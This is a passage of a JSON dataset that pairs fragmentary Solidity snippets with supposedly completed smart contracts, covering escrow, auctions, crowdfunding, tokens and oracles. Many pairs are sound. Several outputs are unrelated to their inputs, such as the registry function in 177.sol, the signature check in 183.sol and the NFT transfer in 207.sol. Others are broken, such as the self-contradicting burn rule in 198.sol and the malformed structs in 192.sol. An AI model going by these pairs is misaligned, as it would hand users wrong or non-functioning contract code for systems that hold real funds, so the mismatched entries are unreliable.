        "input": "pragma solidity ^0.8;\n\ncontract Contract1 {\n    uint[] public newData;\n    \n    constructor(uint _i){\n        newData.push(_i);\n    }\n}\n\ninterface IContract1 {\n    function newData(uint256 _index) external returns(uint);\n}\n\ncontract Contract2 {\n    uint public newOne;\n\n    function foo(address _addr, uint _i) external{\n        newOne = IContract1(_addr).newData(_i);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract Contract1 {\n    // changed visibility to `public`\n    uint[] public newData;\n    \n    constructor(uint _i){\n        newData.push(_i);\n    }\n}\n\ninterface IContract1 {\n    // added `_index` argument\n    // changed the return value to one item of the array\n    function newData(uint256 _index) external returns(uint);\n}\n\ncontract Contract2 {\n    uint public newOne;\n\n    function foo(address _addr, uint _i) external{\n        // changed the call to the getter function\n        // instead of trying to access the property directly\n        newOne = IContract1(_addr).newData(_i);\n    }\n}\n\n"
    },
    "176.sol": {
        "input": " uint256 price = ethPrice;\n mapping(uint => uint) mappingEthPrice;\n\npayable(msg.sender).transfer(amountToWithdraw); \n\npragma solidity ^0.8.6;\n\n\nimport \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\";\n\ninterface EACAggregatorProxy {\n    function latestAnswer() external view returns (int256);\n}\n\ncontract oracleLink {\n\n    address public dev;\n    uint public devDeposit;\n    uint[] public devDeposits;\n\n    address[] public users;                   \n    uint[] public totalDeposited;  \n\n    mapping(address => uint) balances;\n\n    function deployerIsDeveloper() public payable {\n        dev = msg.sender;\n        devDeposit = msg.value;\n        devDeposits.push(devDeposit);                   \n    }\n\n    address user;\n    uint amountDeposit;\n    uint256 deadline;\n\n    uint256 lockAmount = lockAmounts[msg.sender];\n    mapping(address => uint) lockAmounts;\n\n    uint256 startTime = startTimes[block.timestamp];\n    mapping(uint => uint) startTimes; \n\n    address public chainLinkETHUSDAddress = 0x9326BFA02ADD2366b30bacB125260Af641031331;\n\n    uint public ethPrice = 0; \n    uint256 price = ethPrice;\n    mapping(uint => uint) mappingEthPrice;\n\n    function deposit(uint256 numberOfSeconds) public payable {\n\n        lockAmounts[msg.sender] = msg.value;\n        startTimes[block.timestamp] = block.timestamp;\n        \n        user = msg.sender;           \n        amountDeposit = msg.value;      \n        \n        users.push(user);                     \n        totalDeposited.push(amountDeposit);\n\n        deadline = block.timestamp + (numberOfSeconds * 1 seconds);\n\n        int256 chainLinkEthPrice = EACAggregatorProxy(chainLinkETHUSDAddress).latestAnswer();\n        ethPrice = uint(chainLinkEthPrice / 100000000);\n    }\n\n    function withdraw() public payable {\n        require(block.timestamp >= deadline);\n        uint amountToWithdraw = lockAmounts[msg.sender];\n        lockAmounts[msg.sender] = 0; \n        payable(msg.sender).transfer(amountToWithdraw); \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface EACAggregatorProxy {\n    function latestAnswer() external view returns (int256);\n}\n\ncontract oracleLink {\n\n    address public dev;\n    uint public devDeposit;\n    uint[] public devDeposits;\n\n    address[] public users;                   \n    uint[] public totalDeposited;  \n\n    mapping(address => uint) balances;\n\n    function deployerIsDeveloper() public payable {\n        dev = msg.sender;\n        devDeposit = msg.value;\n        devDeposits.push(devDeposit);                   \n    }\n\n    address user;\n    uint amountDeposit;\n    uint256 deadline;\n\n    uint256 lockAmount = lockAmounts[msg.sender];\n    mapping(address => uint) lockAmounts;\n\n    uint256 startTime = startTimes[block.timestamp];\n    mapping(uint => uint) startTimes; \n\n    address public chainLinkETHUSDAddress = 0x9326BFA02ADD2366b30bacB125260Af641031331;\n\n    uint public ethPrice = 0; \n    uint256 price = ethPrice;\n    mapping(uint => uint) mappingEthPrice;\n\n    function deposit(uint256 numberOfSeconds) public payable {\n\n        lockAmounts[msg.sender] = msg.value;\n        startTimes[block.timestamp] = block.timestamp;\n        \n        user = msg.sender;           \n        amountDeposit = msg.value;      \n        \n        users.push(user);                     \n        totalDeposited.push(amountDeposit);\n\n        deadline = block.timestamp + (numberOfSeconds * 1 seconds);\n\n        int256 chainLinkEthPrice = EACAggregatorProxy(chainLinkETHUSDAddress).latestAnswer();\n        ethPrice = uint(chainLinkEthPrice / 100000000);\n    }\n\n    function withdraw() public payable {\n        require(block.timestamp >= deadline);\n        uint amountToWithdraw = lockAmounts[msg.sender];\n        lockAmounts[msg.sender] = 0; \n        payable(msg.sender).transfer(amountToWithdraw); \n    }\n}\n\n"
    },
    "177.sol": {
        "input": "function setkturia(string memory dhmos,string memory fek,string memory apof,string memory dieuth,string memory status,string memory cid) public {\n    kturiapinakas memory value = kturiapinakas(\n        dhmos,\n        fek,\n        apof,\n        dieuth,\n        status,\n        cid,\n        block.timestamp\n    );\n    kturiaupoPinakas.push(value);\n    kturiap[block.timestamp] = value;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\n    abstract contract Context {\n        function _sendTokenToAddress(address to, uint256 amount) internal virtual returns (bool);\n    }\n\n    abstract contract ERC20 {\n        function safeTransferFrom(address from, address to, uint256 value) internal virtual returns (bool);\n    }\n\n"
    },
    "180.sol": {
        "input": "import \"./UIntFunctions.sol\";\n\ncontract Game {\n    using UIntFunctions for uint;\n    uint public participants;\n    bool public allowTeams;\n\n    constructor(uint _participants) {\n        participants = _participants;\n        allowTeams = _participants.isEven();\n    }\n\n    function isEven(uint _participants) public returns(bool) {\n        if (_participants.isEven()) {\n            return allowTeams = true;\n        }\n        else return allowTeams;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary UIntFunctions {\n    function isEven(uint _participants) internal view returns (bool) {\n        return _participants % 2 == 0;\n    }\n}\n\ncontract Game {\n    using UIntFunctions for uint;\n    uint public participants;\n    bool public allowTeams;\n\n    constructor(uint _participants) {\n        participants = _participants;\n        allowTeams = _participants.isEven();\n    }\n\n    function isEven(uint _participants) public returns(bool) {\n        if (_participants.isEven()) {\n            return allowTeams = true;\n        }\n        else return allowTeams;\n    }\n}\n\n"
    },
    "181.sol": {
        "input": "receive() external payable {}\n\nconstructor(address _tradeToken, uint initialFee, uint256 initalMaxBet, uint256 initalMinBet) public payable {\n    fee = initialFee;\n    maxBet = initalMaxBet;\n    minBet = initalMinBet;\n    owner = msg.sender;\n    token = IERC20(_tradeToken);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function balanceOf(address _owner) external view returns (uint256);\n\n    function transfer(address _to, uint256 _amount) external returns (bool);\n\n    function transferFrom(address _from, address _to, uint256 _amount) external returns (bool);\n\n    function approve(address _spender, uint256 _value) external returns (bool);\n\n    function allowance(address _owner, address _spender) external view returns (uint256);\n\n    event Transfer(address indexed _from, address indexed _to, uint256 amount);\n\n    event Approval(address indexed _owner, address indexed _spender, uint256 amount);\n}\n\n"
    },
    "182.sol": {
        "input": "spool = ISpool(address(0x123));\nbool result = spool.foo(1);\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ISpool {\n    function foo(uint256 a) external view returns (bool ret);\n}\n\ncontract Test {\n    ISpool public spool;\n    \n    constructor(address _spool) {\n        spool = ISpool(_spool);\n    }\n    \n    function test() external {\n        bool result = spool.foo(1);\n        require(result, \"fail\");\n    }\n}\n\n"
    },
    "183.sol": {
        "input": "require(\n  ECDSA.recover(ethSignedMessageHash, _signature) == signer,\n  \"invalid signature\"\n);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function totalSupply() external view returns(uint256);\n    function balanceOf(address account) external view returns(uint256);\n    function transfer(address recipient, uint256 amount) external returns(bool);\n    function allowance(address owner, address spender) external view returns(uint256);\n    function approve(address spender, uint256 amount) external returns(bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n"
    },
    "185.sol": {
        "input": "function decode(bytes memory data) private pure returns(bytes4 selector, uint productAmount, bytes3 color) {\n    assembly {\n      selector := mload(add(data, 32))\n      productAmount := mload(add(data, 64))\n      color := mload(add(data, 96))\n    }\n}\n\n(bytes4 selector, uint productAmount, bytes3 color) =\n  decode(data);\n\nbytes memory funcData =\n  abi.encodeWithSelector(selector, sender, tokensPaid, productAmount, color);\n\n(bool success,) = address(this).call(funcData);\nrequire(success, \"call failed\");\n\nif (selector == this.buy.selector) {\n    buy(sender, tokensPaid, productAmount, color);\n}\n\nfunction onTransferReceived(address operator, address sender, uint256 tokensPaid, bytes calldata data) external override (IERC1363Receiver) returns (bytes4) {\n    require(msg.sender == address(acceptedToken), \"I accept purchases in Payable Tokens\");\n\u200b\n    (bytes4 selector, uint productAmount, bytes3 color) =\n        decode(data);\n\u200b\n    if (selector == this.buy.selector) {\n      buy(sender, tokensPaid, productAmount, color);\n    }\n\u200b\n    return this.onTransferReceived.selector;\n  }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC1363 { function onTransferReceived(address operator, address sender, uint256 tokensPaid, bytes calldata data) external returns (bytes4); }\n\n"
    },
    "186.sol": {
        "input": "function random() view public returns (uint)\n\u00a0\u00a0\u00a0\u00a0{\n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0uint answer = block.timestamp% 10 ;\n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return answer;\n\u00a0\u00a0\u00a0\u00a0}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract RandomNumberGen {\n\n    function random() view public returns (uint)\n    {\n\n        uint answer = block.timestamp% 10 ;\n\n        return answer;\n    }\n}\n\n"
    },
    "189.sol": {
        "input": "contractToken1.methods.function1().send({from: account}).on('transactionHash', (hash)=>{\ncontractToken2.methods.function2().send({from: account}).on('transactionHash',(hash)=> console.log('this was successful'));\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Token1 {\n  event Transfer(address indexed from, address indexed to, uint256 value);\n  function function1() public payable returns(bool) {}\n}\n\ncontract Token2 {\n  event Transfer(address indexed from, address indexed to, uint256 value);\n  function function2() public payable returns(bool) {}\n}\n\n"
    },
    "190.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function foo() external {\n        address recipient = address(0x123);\n        payable(recipient).transfer(1 ether);\n    }\n}\n\npragma solidity ^0.8;\n\ninterface IERC20 {\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\ncontract MyContract {\n\n    function foo() external payable {\n        IERC20 tokenContract = IERC20(address(0x456));\n        tokenContract.transfer(msg.sender, 1);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract IERC20 {\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\ncontract MyContract {\n    function foo() external payable {\n        IERC20 tokenContract = IERC20(address(0x456));\n        tokenContract.transfer(msg.sender, 1);\n    }\n}\n\n"
    },
    "191.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract CrowdFunding {\n    struct Funder {\n        address addr;\n        uint amount;\n    }\n\n    struct Campaign {\n        address beneficiary;\n        uint fundingGoal;\n        uint numFunders;\n        uint amount;\n        mapping (uint => Funder) funders;\n    }\n\n    uint numCampaigns;\n    mapping (uint => Campaign) campaigns;\n\n    function newCampaign(address beneficiary, uint goal) public returns (uint campaignID) {\n        campaignID = numCampaigns++; \n        Campaign storage _campaign = campaigns[campaignID];\n        _campaign.beneficiary = beneficiary;\n        _campaign.fundingGoal = goal;\n        _campaign.numFunders = 0;\n        _campaign.funders[0] = Funder(msg.sender, 100);\n    }\n\n    function contribute(uint campaignID) public payable {\n        Campaign storage c = campaigns[campaignID];\n        c.funders[c.numFunders++] = Funder({addr: msg.sender, amount: msg.value});\n        c.amount += msg.value;\n    }\n\n    function checkGoalReached(uint campaignID) public returns (bool reached) {\n        Campaign storage c = campaigns[campaignID];\n        if (c.amount < c.fundingGoal)\n            return false;\n        uint amount = c.amount;\n        c.amount = 0;\n        return true;\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract CrowdFunding {\n    // Defines a new type with two fields.\n    struct Funder {\n        address addr;\n        uint amount;\n    }\n\n    struct Campaign {\n        address beneficiary;\n        uint fundingGoal;\n        uint numFunders;\n        uint amount;\n        mapping (uint => Funder) funders;\n    }\n\n    uint numCampaigns;\n    mapping (uint => Campaign) campaigns;\n\n    function newCampaign(address beneficiary, uint goal) public returns (uint campaignID) {\n        campaignID = numCampaigns++; // campaignID is return variable\n        // Creates new struct and saves in storage. We leave out the mapping type.\n        Campaign storage _campaign = campaigns[campaignID];\n        _campaign.beneficiary = beneficiary;\n        _campaign.fundingGoal = goal;\n        _campaign.numFunders = 0;\n        _campaign.funders[0] = Funder(msg.sender, 100);\n    }\n\n    function contribute(uint campaignID) public payable {\n        Campaign storage c = campaigns[campaignID];\n        // Creates a new temporary memory struct, initialised with the given values\n        // and copies it over to storage.\n        // Note that you can also use Funder(msg.sender, msg.value) to initialise.\n        c.funders[c.numFunders++] = Funder({addr: msg.sender, amount: msg.value});\n        c.amount += msg.value;\n    }\n\n    function checkGoalReached(uint campaignID) public returns (bool reached) {\n        Campaign storage c = campaigns[campaignID];\n        if (c.amount < c.fundingGoal)\n            return false;\n        uint amount = c.amount;\n        c.amount = 0;\n        //c.beneficiary.transfer(amount);\n        return true;\n    }\n}\n\n"
    },
    "192.sol": {
        "input": "function getScoreDifference (Game.Teams x) public view returns (int256) {\n  if (x == Game.Teams.Team1) {\n    return game.team1Score - game.team2Score;\n  } else if (x == Game.Teams.Team2) {\n    return game.team2Score - game.team1Score;\n  }\n}\n\nfunction getScoreDifference (Game.Teams x) public view returns (int256 score) {\n  if (x == Game.Teams.Team1) {\n    return score = game.team1Score() - game.team2Score();\n  } else if (x == Game.Teams.Team2) {\n    return score = game.team2Score() - game.team1Score();\n  }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Game {\n  struct Game {\n    Teams team1Score;\n    Teams team2Score;\n  }\n\n  struct Teams {\n    int256 score;\n  }\n}\n\n"
    },
    "195.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MedicalHistory {\n    struct Patient {\n        string name;\n        uint16 age;\n    }\n\n    Patient[] _patients;\n\n    function Register(\n        string memory name,\n        uint16 age\n    ) external {\n        Patient memory patient = Patient(name, age);\n        _patients.push(patient);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MedicalHistory {\n    struct Patient {\n        string name;\n        uint16 age;\n    }\n\n    Patient[] _patients;\n\n    function Register(\n        string memory name,\n        uint16 age\n    ) external {\n        Patient memory patient = Patient(name, age);\n        _patients.push(patient);\n    }\n}\n\n"
    },
    "196.sol": {
        "input": "pragma solidity ^0.4.17;\n \ncontract helloGeeks\n{\n  int[] public numbers;\n \n  function Numbers() public\n  {\n    numbers.push(1);\n    numbers.push(2);\n \n    int[] storage myArray = numbers;\n     \n    myArray[0] = 0;\n  } \n}\n\npragma solidity ^0.4.17;\n \ncontract helloGeeks\n{ \n  int[] public numbers;\n   \n  function Numbers() public\n  {\n    numbers.push(1);\n    numbers.push(2);\n     \n    int[] memory myArray = numbers;\n     \n    myArray[0] = 0;\n  } \n}\n\nmapping(key => value) <name>;\n\ncontract helloGeeks\n{ \n  mapping(address => uint) balance;\n   \n \n  function Insert(address _user, uint _amount) public\n  {\n    balance[_user] = _amount\n  } \n\n  function View(address _user) public view returns(uint)\n  {\n    return balance[_user];\n  } \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\n contract helloGeeks {\n  int[] public numbers;\n \n  function Numbers() public\n  {\n    numbers.push(1);\n    numbers.push(2);\n \n    int[] storage myArray = numbers;\n     \n    myArray[0] = 0;\n  } \n}\n\n"
    },
    "197.sol": {
        "input": "    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {\n        return IERC721Receiver.onERC721Received.selector;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC721Receiver {\n\n    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4);\n}\n\ncontract ERC721_Receiver {\n    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {\n        return IERC721Receiver.onERC721Received.selector;\n    }\n}\n\n"
    },
    "198.sol": {
        "input": "contract SimpleStorage { ... }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n    string public name;\n    string public symbol;\n    uint8 public decimals;\n    uint256 public totalSupply;\n    \n    event Burn(address indexed from, uint256 value);\n    event Mint(address indexed to, uint256 value);\n    \n    constructor() {\n        name = \"Simple Storage Contract\";\n        symbol = \"STG\";\n        decimals = 9;\n        totalSupply = 10000000000000000000000000;\n        \n        emit Mint(msg.sender, totalSupply); \n    }\n    \n    function burn(uint256 value) public returns (uint256){\n        require(value == totalSupply, \"Can't burn all tokens\");\n\n        totalSupply = 0;\n        emit Burn(msg.sender, value);\n        \n        emit Mint(msg.sender, totalSupply);\n        return totalSupply;\n    }\n}\n\n"
    },
    "199.sol": {
        "input": "pragma solidity ^0.8;\n\nlibrary TimestampHelper {\n    uint constant SECONDS_PER_DAY = 24 * 60 * 60;\n    uint constant SECONDS_PER_HOUR = 60 * 60;\n\n    function getHour(uint timestamp) internal pure returns (uint hour) {\n        uint secs = timestamp % SECONDS_PER_DAY;\n        hour = secs / SECONDS_PER_HOUR;\n    }\n}\n\ncontract MyContract {\n    function foo() external view {\n        uint currentHour = TimestampHelper.getHour(block.timestamp);\n        require(\n            currentHour >= 8 && currentHour <= 18,\n            \"We're closed now. Opened from 8 AM to 6 PM UTC.\"\n        );\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\nlibrary TimestampHelper {\n    uint constant SECONDS_PER_DAY = 24 * 60 * 60;\n    uint constant SECONDS_PER_HOUR = 60 * 60;\n\n    function getHour(uint timestamp) internal pure returns (uint hour) {\n        uint secs = timestamp % SECONDS_PER_DAY;\n        hour = secs / SECONDS_PER_HOUR;\n    }\n}\n\ncontract MyContract {\n    function foo() external view {\n        uint currentHour = TimestampHelper.getHour(block.timestamp);\n        require(\n            currentHour >= 8 && currentHour <= 18,\n            \"We're closed now. Opened from 8 AM to 6 PM UTC.\"\n        );\n    }\n}\n\n"
    },
    "200.sol": {
        "input": "return uint80(uint256(_phaseId) << 64 | _aggregatorRoundId);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract EthereumAggregatorV2 {\n    struct Round {\n        uint256 phaseId;\n        uint256 roundId;\n        uint256 aggregatorRoundId;\n    }\n\n    constructor() public {}\n\n    function getAggregatorRoundId(uint256 _phaseId, uint256 _aggregatorRoundId) public view returns(uint80) {\n        return uint80(uint256(_phaseId) << 64 | _aggregatorRoundId);\n    }\n}\n\n"
    },
    "202.sol": {
        "input": "\npragma solidity >=0.7.0 <0.9.0;\n\ncontract Auction {\naddress payable internal auction_owner; \nuint256 public auction_start; \nuint256 public auction_end; \nuint256 public highestBid;\naddress public highestBidder;\n\nenum auction_state {\nCANCELLED, STARTED,ENDED\n}\naddress[] bidders;\n\nmapping(address => uint) public bids; \n\nauction_state public STATE;\n\n\n\nmodifier an_ongoing_auction() { require(block.timestamp <= auction_end);\n_;\n}\n\nmodifier only_owner() { require(msg.sender == auction_owner);\n_;\n}\n\nfunction MyAuction (uint _biddingTime, address payable  _owner) public {\n     auction_owner = _owner; \n     auction_start = block.timestamp;\n    auction_end = auction_start + _biddingTime* 1 minutes;\n     STATE = auction_state.STARTED;\n    if (block.timestamp>auction_end){\n        STATE=auction_state.ENDED;\n        auction_owner.transfer(highestBid);\n        bids[highestBidder]=0;\n        \n    } \n\n}\n\nfunction bid() public payable an_ongoing_auction returns (bool){ \n\n    require(bids[msg.sender] + msg.value > highestBid, \"can't bid, Make a higher Bid\" );\n\n    highestBidder = msg.sender; \n    highestBid = msg.value; \n    bidders.push(msg.sender);\n    bids[msg.sender] = bids[msg.sender] + msg.value; \n    emit BidEvent(highestBidder, highestBid);\n    return true; \n    }\n\n    \nfunction withdraw() public payable returns (bool){\n    require(block.timestamp > auction_end , \"can't withdraw, Auction is still open\");\n    uint amount= bids[msg.sender];\n    bids[msg.sender] = 0; \n    payable(msg.sender).transfer(amount); \n    emit WithdrawalEvent(msg.sender, amount);\n    return true;\n}\nfunction cancel_auction() only_owner an_ongoing_auction public returns (bool) {\n     STATE = auction_state.CANCELLED;\n    emit CanceledEvent(\"Auction Cancelled\", block.timestamp,highestBid); \n    return true;\n}\nfunction time_remain() an_ongoing_auction public view returns (uint256){\nuint256 timeleft= auction_end - block.timestamp;\nreturn timeleft; \n\n}\n\nevent BidEvent(address highestBidder, uint256 highestBid); \n\nevent WithdrawalEvent(address withdrawer, uint256 amount);\n\nevent CanceledEvent(string message, uint256 time, uint256 highestBid);\n    \n}\n\n\n\n",
        "output": "\n//SPDX-License-Identifier: Unlicense\npragma solidity >=0.7.0 <0.9.0;\n\ncontract Auction {\naddress payable internal auction_owner; \nuint256 public auction_start; \nuint256 public auction_end; \nuint256 public highestBid;\naddress public highestBidder;\n\nenum auction_state {\nCANCELLED, STARTED,ENDED\n}\naddress[] bidders;\n\nmapping(address => uint) public bids; \n\nauction_state public STATE;\n\n\n\nmodifier an_ongoing_auction() { require(block.timestamp <= auction_end);\n_;\n}\n\nmodifier only_owner() { require(msg.sender == auction_owner);\n_;\n}\n\nfunction MyAuction (uint _biddingTime, address payable  _owner) public {\n     auction_owner = _owner; \n     auction_start = block.timestamp;\n    auction_end = auction_start + _biddingTime* 1 minutes;\n     STATE = auction_state.STARTED;\n    if (block.timestamp>auction_end){\n        STATE=auction_state.ENDED;\n        auction_owner.transfer(highestBid);\n        bids[highestBidder]=0;\n        \n    } \n\n}\n\nfunction bid() public payable an_ongoing_auction returns (bool){ \n\n    require(bids[msg.sender] + msg.value > highestBid, \"can't bid, Make a higher Bid\" );\n\n    highestBidder = msg.sender; \n    highestBid = msg.value; \n    bidders.push(msg.sender);\n    bids[msg.sender] = bids[msg.sender] + msg.value; \n    emit BidEvent(highestBidder, highestBid);\n    return true; \n    }\n\n    \nfunction withdraw() public payable returns (bool){\n   // address payable rec = msg.sender;\n    require(block.timestamp > auction_end , \"can't withdraw, Auction is still open\");\n    uint amount= bids[msg.sender];\n    bids[msg.sender] = 0; \n    payable(msg.sender).transfer(amount); \n    emit WithdrawalEvent(msg.sender, amount);\n    return true;\n}\nfunction cancel_auction() only_owner an_ongoing_auction public returns (bool) {\n     STATE = auction_state.CANCELLED;\n    emit CanceledEvent(\"Auction Cancelled\", block.timestamp,highestBid); \n    return true;\n}\nfunction time_remain() an_ongoing_auction public view returns (uint256){\nuint256 timeleft= auction_end - block.timestamp;\nreturn timeleft; \n\n}\n\nevent BidEvent(address highestBidder, uint256 highestBid); \n\nevent WithdrawalEvent(address withdrawer, uint256 amount);\n\nevent CanceledEvent(string message, uint256 time, uint256 highestBid);\n    \n}\n\n\n"
    },
    "203.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint[2] stateArray1 = [1, 2];\n    uint[2] stateArray2 = [3, 4];\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint[2] stateArray1 = [1, 2];\n    uint[2] stateArray2 = [3, 4];\n}\n\n"
    },
    "204.sol": {
        "input": "pragma solidity 0.6.12;\npragma experimental ABIEncoderV2;\n\ncontract test{\n    mapping(address => address) public managers;\n\n    struct tokenInfo{\n      address token;\n      uint256 decimals;\n      uint256 amount;\n  }\n\n   struct recordInfo{\n       uint time;\n       tokenInfo[] tokens;\n   }\n   \n   mapping(address => mapping(uint => recordInfo)) public record_List;\n\n    function claim(address pool, uint idRecord) public {    \n        address manager = address(0);\n        require(managers[pool] != manager,\"claim is not manager\");\n        recordInfo storage record = record_List[pool][idRecord];\n        delete record.time;\n        delete record.tokens;\n        record.time = block.timestamp;\n        for( uint i = 0;i < 2;i++){\n            uint balance;\n            tokenInfo memory token; \n            token.token = address(0);\n            token.amount = balance;\n            token.decimals = 18;\n            record.tokens.push(token);\n        }\n        record_List[pool][2] = record;\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.6.12;\n// Contracts\npragma experimental ABIEncoderV2;\n\ncontract test{\n    mapping(address => address) public managers;\n\n    struct tokenInfo{\n      address token;\n      uint256 decimals;\n      uint256 amount;\n  }\n\n   struct recordInfo{\n       uint time;\n       tokenInfo[] tokens;\n   }\n   \n   mapping(address => mapping(uint => recordInfo)) public record_List;\n\n    function claim(address pool, uint idRecord) public {    \n        address manager = address(0);\n        require(managers[pool] != manager,\"claim is not manager\");\n        // NOTE: I retrieve a specific element from record_List mapping using pool and idRecord parameters for querying the mapping\n        recordInfo storage record = record_List[pool][idRecord];\n        delete record.time;\n        delete record.tokens;\n        record.time = block.timestamp;\n        for( uint i = 0;i < 2;i++){\n            uint balance;\n            tokenInfo memory token; \n            token.token = address(0);\n            token.amount = balance;\n            token.decimals = 18;\n            record.tokens.push(token);\n        }\n        record_List[pool][2] = record;\n    }\n}\n\n"
    },
    "205.sol": {
        "input": "contract YourContract is Ownable {\n\nuint256 public maxAmount = 10;\nuint256 public price = 10 ether;\n\nfunction mint(address _to, uint256 _mintAmount) public payable {\n    require(_mintAmount > 0); \n    require(_mintAmount <= maxAmount);\n   \n    if (msg.sender != owner()) {       \n          require(msg.value >= price * _mintAmount);     \n    }\n    \n    for (uint256 i = 1; i <= _mintAmount; i++) {\n      _safeMint(_to, i);\n    }\n  }\n}\n\n function _safeMint(address to, uint256 tokenId) internal virtual {\n        _safeMint(to, tokenId, \"\");\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\nabstract contract Ownable {\n  address internal owner;\n\n  constructor() {\n    owner = msg.sender;\n  }\n\n  modifier onlyOwner {\n    require(msg.sender == owner, \"Ownable: caller is not the owner\");\n    _;\n  }\n\n  function setOwner(address newOwner) public onlyOwner {\n    owner = newOwner;\n  }\n}\n\n"
    },
    "206.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract ContractA {\n    address contractB;\n    \n    modifier onlyContractB {\n        require(msg.sender == contractB);\n        _;\n    }\n\n    function foo() external onlyContractB {\n    }\n    \n    function setContractBAddress(address _contractB) external {\n        contractB = _contractB;\n    }\n}\n\npragma solidity ^0.8;\n\ninterface IContractA {\n    function foo() external;\n}\n\ncontract ContractB {\n    IContractA contractA;\n    \n    constructor(address _contractA) {\n        contractA = IContractA(_contractA);\n    }\n\n    function callFoo() external {\n        contractA.foo();\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract ContractA {\n    address contractB;\n    \n    modifier onlyContractB {\n        require(msg.sender == contractB);\n        _;\n    }\n\n    function foo() external onlyContractB {\n    }\n    \n    function setContractBAddress(address _contractB) external {\n        contractB = _contractB;\n    }\n}\n\npragma solidity ^0.8;\n\ninterface IContractA {\n    function foo() external;\n}\n\ncontract ContractB {\n    IContractA contractA;\n    \n    constructor(address _contractA) {\n        contractA = IContractA(_contractA);\n    }\n\n    function callFoo() external {\n        contractA.foo();\n    }\n\n}\n\n"
    },
    "207.sol": {
        "input": "function transferNFTtoNewOwner(NFTItem memory t,address oldOwner, address newOwner) internal {\n    require(newOwner != address(0), \"New owner can't be address zero.\");\n    XXXX storage r = creatureList[t.tokenAddress][t.tokenId];\n    IERC721 nft = IERC721(t.tokenAddress);\n    nft.safeTransferFrom(oldOwner, newOwner, t.tokenId); \n    address currOwner = nft.ownerOf(t.tokenId);\n    require(newOwner == currOwner, \"Problem on nft transfer\");\n    r.owner = newOwner; \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nabstract contract Ownable {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () internal {\n        address msgSender = msg.sender;\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    modifier onlyOwner() {\n        require (_owner == msg.sender, \"Ownership not transferred\");\n        _;\n    }\n\n    function transferOwnership(address newOwner) public onlyOwner {\n        require(newOwner != address(0), \"New owner can't be address zero.\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n}\n\ncontract CreatureList {\n    address[] public creatureList;    \n}\n\n"
    },
    "208.sol": {
        "input": "payable(buyer).transfer(msg.value);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Escrow {\n\n  receive() external payable {\n    payable(buyer).transfer(msg.value);\n  }\n\n  address private buyer;\n\n}\n\n"
    },
    "209.sol": {
        "input": "interface IPancakeswapV2Router02 is IPancakeswapV2Router01 {\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountETH);\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountETH);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\n\n",
